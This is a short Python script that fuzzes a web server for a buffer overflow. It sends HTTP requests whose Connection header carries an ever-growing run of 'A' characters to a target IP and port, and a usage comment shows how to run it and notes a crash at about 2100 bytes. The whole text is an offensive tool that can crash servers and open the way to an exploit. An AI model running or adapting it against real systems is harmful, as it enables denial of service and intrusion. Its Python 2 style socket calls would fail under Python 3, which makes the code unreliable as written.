import socket
import sys

# script stop with 2100
# how to execute:
# python overflow.py 192.168.1.109 80

ip = sys.argv[1]
port = int(sys.argv[2])

junk = ("A" * 1000)

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print("Fuzzing " + str(len(junk)))
        buff = ("GET / HTTP/1.1\r\n")
        s.send(buff)
        buff = ("Host: " + ip + "\r\n")
        s.send(buff)
        buff = ("Connection: " + junk + "\r\n\n")
        s.send(buff)
        s.recv(1024)
        s.close()
        junk += ("A" * 100)
    except:
        sys.exit(0)
